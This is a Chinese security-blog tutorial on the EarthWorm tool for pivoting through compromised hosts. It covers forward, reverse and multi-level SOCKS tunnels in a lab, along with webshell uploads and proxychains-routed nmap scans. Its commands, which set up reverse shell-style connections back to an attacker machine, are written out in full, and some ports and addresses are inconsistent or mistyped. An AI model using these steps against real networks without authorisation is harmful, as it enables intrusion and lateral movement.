> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/LgvHAbCaDiEQf08w8D4kGA)

EW（Earthworm）是一套便携式的网络穿透工具，具有 SOCKS v5 服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。

下载地址：https://github.com/idlefire/ew

官方网站：http://rootkiter.com/EarthWorm/

EW 的指令信息如下所示：

```
-s   选择功能类型：
  共包含6种功能：      
      ssocksd：正向代理       
      rcsocks：反向代理1，流量转发       
      rssocks：反向代理2，反弹socks5       
      lcx_listen：反向代理1，流量转发       
      lcx_tran：端口转发       
      lcx_slave：端口绑定 
  -l    指定要监听的本地端口  
  -d   指定要反弹到的机器 ip 
  -e   指定要反弹到的机器端口 
  -f    指定要主动连接的机器 ip 
  -g   指定要主动连接的机器端口 
  -t    指定超时时长,默认为1000
```

接下来将带领大家介绍在不同网络环境下 EW 工具的使用方式：

**案例 1、**正向代理功能

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qlullsOibR1BIpOicTskibl5Cd6HiaTOPQStibac2e4mkpNq4YGOibiaVMbWqjNkfrjySyJDk1rbhGtncwWg/640?wx_fmt=png)

**如图所示：**

Hack  IP 地址为：192.168.1.130

Host1 为双网卡：NET1 192.168.1.128、NET2 192.16.2.130

Host2 IP 地址为：192.16.2.131

**攻击方式：**

攻击者（Hack） 首先攻击 Host1 服务器，并获取 shell 权限，然后将 Host1 服务器当作跳板，进而发起对 Host2 主机的进攻；

（1）网络文件上传，恶意文件；

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qlullsOibR1BIpOicTskibl5CdtNA0lY307bLRv6Od08mPGPyS3dBicLRMGeFAic8JL0mKKjqwpMeemTOQ/640?wx_fmt=png)

（2）蚁剑远程连接，查看 Host1 系统为 windows 系统，上传 ew_win32.exe 可执行程序文件；

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qlullsOibR1BIpOicTskibl5CdtB3xfuTLpfebeZDjzJAUGuDibiaicP9LU31A7xPyibribAmCFfsdcOhuibiaA/640?wx_fmt=png)

（3）在 Host1 主机上启动 socks5 服务并监听 1080 端口；

```
./ew -s ssocksd -l 9999  //在9999端口上开启socks代理，ssocksd提供正向代理功能
```

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qlullsOibR1BIpOicTskibl5CdfVwQD4GEQeFu44ovDkz9sXnYkiaK5ukJzf1nr4yJDA3Qcwviab2d7fbA/640?wx_fmt=png)

(4) 修改 proxychains 配置文件，kali 系统默认文件路径为 /etc/proxychains.conf

```
[ProxyList] 
# add proxy here ... 
socks5  192.168.1.128 9999
```

(5) 通过代理，利用 nmap 扫描工具对 Host2 主机进行端口扫描；

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qlullsOibR1BIpOicTskibl5Cd0KyfT45O0DLdqJAfcPynbk9HczBGOnDWaMtamOTJaQX0DPLpIzek6w/640?wx_fmt=png)

**案例 2、**反向代理功能

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qlullsOibR1BIpOicTskibl5Cd6HiaTOPQStibac2e4mkpNq4YGOibiaVMbWqjNkfrjySyJDk1rbhGtncwWg/640?wx_fmt=png)

**如图所示：**

Hack  IP 地址为：192.168.1.130

Host1 为双网卡：NET1 192.168.1.128、NET2 192.16.2.130

Host2 IP 地址为：192.16.2.131

**攻击方式：**

(1) 由于场景中目标机 Host1 没有公网 IP，但是能访问公网。因为 V1 没有具体地址，无法使用正向连接，可使用反弹连接的方式代理流量。  在攻击机 Hack 本地启动流量转发，将来自外部 1080 端口的流量转发到本地 8888 端口，并等待目标反弹连接：

```
./ew -s rcsocks -l 1080 -e 9999  //将1080端口收到的代理请求转发给反连9999端口的主机
```

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qlullsOibR1BIpOicTskibl5CdrdRWV8NibKOd59M6VvA107f9JLsK6EPKe1YwSyWqaCJpKw6TuyFeOpA/640?wx_fmt=png)

(2) 在目标机 Host1 上启动 socks5 服务，并反弹到攻击机 Hack 的 9999 端口：

```
./ew -s rssocks -d 192.168.1.130 -e 9999  //内网跳板反弹连接到攻击机的8888端口
```

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qlullsOibR1BIpOicTskibl5CdcOHlXvlj6bRibGzWwoPO8gAlskNTtVRFnoMdDFEC46UFlTvZdSaOO7Q/640?wx_fmt=png)  

(3) 修改 proxychains 配置文件，kali 系统默认文件路径为 /etc/proxychains.conf

```
[ProxyList] 
# add proxy here ... 
socks5  192.168.1.130 1080
```

(4) 通过代理，利用 nmap 扫描工具对 Host2 主机进行端口扫描；

```
proxychains nmap -Pn -sT 192.16.2.131 -p80,22
```

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qlullsOibR1BIpOicTskibl5CdvEib67zeqJrGyeGxa5ezKs1QtQic7Fp8c7JywVdbC4RAYhVFsBGGqpYA/640?wx_fmt=png)

**案例 3、**二级正向代理功能

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qlullsOibR1BIpOicTskibl5CdU7MvRrxM6BcHKjkf2Ef4O95ZibubfYDIoh4e9S79ylODYVyiacVPqmyw/640?wx_fmt=png)

**如图所示：**

Hack  IP 地址为：192.168.1.130

Host1 为双网卡：NET1 192.168.1.128、NET2 192.16.2.130

Host2 IP 地址为：192.16.2.131、NET2 10.10.3.130

**攻击方式：**

(1) 在 Host1 主机上启动 socks5 服务并监听 1080 端口；

(2) 修改 proxychains 配置文件，kali 系统默认文件路径为 

/etc/proxychains.conf；

```
./ew -s ssocksd -l 1080
```

```
[ProxyList] 
# add proxy here ... 
socks5  192.168.1.128 1080
```

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qlullsOibR1BIpOicTskibl5CdxhytsTzQL00yvb8GFABCgft4WllztP849cib3Z3azlMZicAaKTrUUzDQ/640?wx_fmt=png)

（2）通过 proxychains 执行 firefox 并访问网站，进行恶意文件上传；

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qlullsOibR1BIpOicTskibl5Cdy1WGKXOFibYdSNtvpWsrxNYKbxO3C90AUrZ0ydRCxiacjQAUJxuO4nfA/640?wx_fmt=png)

（3）在蚁剑中添加代理，并进行远程连接；

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qlullsOibR1BIpOicTskibl5CdqibeAggnIdo2GgFKZ5kicgbdFxdF6zicCXtcIB0GKbMT9ByrF8HwP0UoQ/640?wx_fmt=png)

（4）查看，此时获得的主机为 linux 系统，并在该主机（Host2）上启动 socks5 代理并监听 9999 端口：

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qlullsOibR1BIpOicTskibl5CdJoev5N2PbOtvjGVYTFEYiahYfqWAwf89EoicwwV1sEeKwB2T7iaobduUw/640?wx_fmt=png)

(5) 在 Host1 主机上进行流量转发，Host1 监听 1082 端口，并反向连接 Host2 主机，将 Host1 的 1082 端口与 Host2 主机的 9999 端口进行绑定；

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qlullsOibR1BIpOicTskibl5Cd7XXFlGn4elBdEF4iaQLPLYHcEr4RvibVWOmUC1hbfbr7HiapqCSuicicoIA/640?wx_fmt=png)

(6) 修改 proxychains 配置文件，kali 系统默认文件路径为 /etc/proxychains.conf；

```
[ProxyList] 
# add proxy here ... 
socks5  192.168.1.128 1082
```

(7) 通过代理，利用 nmap 扫描工具对 Host3 主机进行端口扫描；  

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qlullsOibR1BIpOicTskibl5CdsGibHTgaq6LYibbmdLJcGDKuRnyc5AKkfoQQvjnVClmDalkPVoXezLZA/640?wx_fmt=png)

**案例 4、**二级反向代理功能

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qlullsOibR1BIpOicTskibl5CdU7MvRrxM6BcHKjkf2Ef4O95ZibubfYDIoh4e9S79ylODYVyiacVPqmyw/640?wx_fmt=png)

**如图所示：**  

Hack  IP 地址为：192.168.1.130

Host1 为双网卡：NET1 192.168.1.128、NET2 192.16.2.130

Host2 IP 地址为：192.16.2.131、NET2 10.10.3.130

(1) 在攻击机 Hack 本地启动流量转发，将来自外部 1080 端口的流量转发到本地 8888 端口，并等待目标反弹连接：

```
./ew -s lcx_listen -l 1080 -e 8888
```

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qlullsOibR1BIpOicTskibl5CduQDXnzVzUn8lia2oPfEwNHn6xxETV44j3jz1BNqFlqicN5Tlziab4rQ5Q/640?wx_fmt=png)

(2) 在经过一系列操作以后，获取 Host1 shell 权限，在 Host1 主机上执行 socks 反弹到 Hack 主机的监听端口 8888：

```
./ew -s rssocks -d 192.168.1.130 -e 8888 //内网跳板反弹连接到攻击机的8888端口
```

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qlullsOibR1BIpOicTskibl5CdCOuib9d6oJedEDibkF3RXSeREnXLq8Tc4YES0NOzown1BYTSHbbiazU1Q/640?wx_fmt=png)

(3) 修改 proxychains 配置文件，kali 系统默认文件路径为 /etc/proxychains.conf；

```
[ProxyList] 
# add proxy here ... 
socks5  192.168.1.130 1080
```

(4) 通过代理，利用 nmap 扫描工具对 Host2 主机进行端口扫描；

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qlullsOibR1BIpOicTskibl5CdTIxu2mxE6knG2UByzQO9Xiad9mh0JB2rl17k9Sx2giaokia8xia9jW1ekQ/640?wx_fmt=png)

(5) 通过代理，访问 Host2 主机的 web 服务，并进行恶意文件上传；

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qlullsOibR1BIpOicTskibl5CdUGaGBz01XvP8k48R1P2icldLBoZpGgThf45ykCLWweefUuFRVEK37Dg/640?wx_fmt=png)

(5) 蚁剑中设置代理；

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qlullsOibR1BIpOicTskibl5CdD7sL8gE3YSiaic2hxjibIgJ4jlZsb9bRksBbrhlsmNACaibkbKXJHKJNEQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qlullsOibR1BIpOicTskibl5CdayFUUovpBJibTg2hStHOib7mtJY0ah5TkfibDq0FacFkV8Ov89ygAzQLA/640?wx_fmt=png)

(6) 在 Host2 主机开启 socks5 服务，并监听 9999 端口；

```
./ew -s ssocksd -l 9999
```

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qlullsOibR1BIpOicTskibl5Cdc7BoIWCnuw9mzhZmiaWy1llGAj5IoPc6kcbUI96z1DGcgkiag1yXUlHA/640?wx_fmt=png)

(7) 在 Hack 主机，将来自外部 1081 端口的流量转发到本地 7777 端口，并等待目标反弹连接；

```
./ew -s lcx_listen -l 1081 -e 7777
```

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qlullsOibR1BIpOicTskibl5CdoxiaveqArERrhDXgJnDw7BlUiaPN6XHGoVflHsV11JibuvsI7kD69vViaw/640?wx_fmt=png)

(8) 在 Host1 主机，将 Hack 的 7777 端口与 Host2 的 9999 端口绑定，建立 socks5 通道；

```
ew.exe -s lcx_slave -d 192.168.1.130 -e 7777 -f 192.16.2.131 -g 99
```

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qlullsOibR1BIpOicTskibl5Cdr3GEHlibIn5mibnxJiaO05yzyCiaDuWMc1TLLxNOgXWFoUMwKQvCQiaL3Ig/640?wx_fmt=png)

(8) 修改 proxychains.conf 为 192.168.1.130 8081 端口，通过代理，利用 nmap 扫描工具对 Host2 主机进行端口扫描；

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qlullsOibR1BIpOicTskibl5Cd1D5MSHy8sm3vdyolwuMMIMplvjTaAjL31PZ0ahpY5a536YbNoVibfnA/640?wx_fmt=png)

**案例 5、**三级正向代理功能

假设目标机 Host1 有公网 IP（139.x.x.x），可以使用正向的方式代理流量。  在 Host2 上启动流量转发，将 Host1 的 1080 端口与 V2 的 9999 端口绑定，建立 socks5 通道：

```
./ew -s lcx_tran -l 1080 -f 10.10.2.111 -g 9999
```

在 Host2 上启动流量转发，将 Host2 的 9999 端口与 V3 的 8888 端口绑定，建立 socks5 通道：

```
./ew -s lcx_tran - l 9999 -f 10.10.3.111 -g 8888
```

在目标机 Host3 上启动 socks5 代理并监听 8888 端口：

```
./ew -s ssocksd -l 8888
```

方式不止一种：通过场景二中反向代理的方式，从 V1→V3 架设也能实现。  接着流量代理到 139.x.x.x 的 1080 端口，就相当于把流量代理到目标机 V3 上了。  A1 上 proxychains 代理配置：

```
[ProxyList]
socks5    139.x.x.x    1080
```

**案例 6、** 三级反向代理功能

在攻击机 Hack 执行，本地启动流量转发，将来自外部 1080 端口的流量转发到本地的 8888 端口，并等待目标反弹连接：

```
./ew -s rcsocks -l 1080 -e 8888
```

在 Host1 执行，将 Hack 的 8888 端口与 V2 的 9999 端口绑定，建立 socks5 通道：

```
./ew -s lcx_slave -d 120.x.x.x -e 8888 -f 10.10.2.111 -g 9999
```

在 Host2 执行，本地启动流量转发，将来自外部 9999 端口的流量转发到本地的 7777 端口，等待目标机 Host3 反弹连接：

```
./ew -s lcx_listen -l 9999 -e 7777
```

在目标机 Host3 执行，启动 socks5 服务，并反弹到 Host2 的 7777 端口：

```
./ew -s rssocks -d 10.10.2.111-e 7777
```

代理通道架设完毕，访问 Hack 的 1080 相当于访问 Host3 的 7777 端口，在攻击机 Hack 上使用 proxychain 将流量代理到本地 1080 端口，相当于把流量代理到目标机 Host3 上了，在 A1 上发起请求相当于在 Host3 上发起请求。  Hack 上 proxychains 代理配置：

```
[ProxyList]
socks5    127.0.0.1    1080
```

最后在 Host1 执行，将 Hack 的 8888 端口与 Host2 的 9999 端口绑定，建立 socks5 通道。

- 往期推荐 -

  

[安全攻防 | reGeorg+Proxifier 代理工具](http://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&mid=2247485966&idx=1&sn=db3971fab27c17cc324af10b204b0a4d&chksm=cf4d856ff83a0c79157ab92ab94ac66e1d6721f8c2f0ca66c54a2d0945745f3c7852a5c4b862&scene=21#wechat_redirect)

  

  

[安全攻防 | CobaltStrike 代理工具](http://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&mid=2247487998&idx=1&sn=81b2be4431de14d47a4e20bad9400817&chksm=cf4d9e9ff83a178956f9a4ae6c551885d6ac91d5af6af1d1f97a532f7e866287aa90b2efe15b&scene=21#wechat_redirect)

[安全攻防 | Metasploit 代理工具](http://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&mid=2247487748&idx=1&sn=0acfe0b74ea4c3dd03aec0657016ca8d&chksm=cf4d9e65f83a1773dc5a3cf03c7036f4092f424054252b79b9c68e2bcf59b6115e37af6b65d6&scene=21#wechat_redirect)

**【推荐书籍】**